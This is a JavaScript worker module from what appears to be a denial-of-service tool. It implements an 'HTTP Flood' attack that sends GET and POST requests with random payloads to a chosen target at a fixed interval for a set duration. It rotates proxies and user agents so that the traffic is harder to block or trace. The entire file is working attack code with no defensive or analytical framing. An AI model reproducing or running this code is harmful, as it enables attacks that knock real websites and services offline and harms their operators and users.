import { parentPort, workerData } from "worker_threads";

import { createMimicHttpClient } from "../utils/clientUtils.js";
import { randomBoolean, randomString } from "../utils/randomUtils.js";

export const info = {
  id: "http_flood",
  name: "HTTP Flood",
  description: "Floods the target with HTTP requests.",
  supportedProtocols: ["http", "https", "socks4", "socks5"],
};

const startAttack = () => {
  const { target, proxies, userAgents, duration, packetDelay, packetSize } =
    workerData;

  const fixedTarget = target.startsWith("http") ? target : `https://${target}`;
  let totalPackets = 0;
  const startTime = Date.now();

  const sendRequest = async (proxy, userAgent) => {
    try {
      const client = createMimicHttpClient(proxy, userAgent);
      const isGet = packetSize > 64 ? false : randomBoolean();
      const payload = randomString(packetSize);

      if (isGet) {
        await client.get(`${fixedTarget}/${payload}`);
      } else {
        await client.post(fixedTarget, payload);
      }

      totalPackets++;
      parentPort.postMessage({
        log: {
          key: "request_success",
          params: {
            proxy: `${proxy.protocol}://${proxy.host}:${proxy.port}`,
            target: fixedTarget,
          },
        },
        totalPackets,
      });
    } catch (error) {
      parentPort.postMessage({
        log: {
          key: "request_failed",
          params: {
            proxy: `${proxy.protocol}://${proxy.host}:${proxy.port}`,
            target: fixedTarget,
            error: error.message,
          },
        },
        totalPackets,
      });
    }
  };

  const interval = setInterval(() => {
    const elapsedTime = (Date.now() - startTime) / 1000;

    if (elapsedTime >= duration) {
      clearInterval(interval);
      parentPort.postMessage({ log: { key: "attack_finished" }, totalPackets });
      process.exit(0);
    }

    const proxy = proxies[Math.floor(Math.random() * proxies.length)];
    const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];

    sendRequest(proxy, userAgent);
  }, packetDelay);
};

if (workerData) {
  startAttack();
}
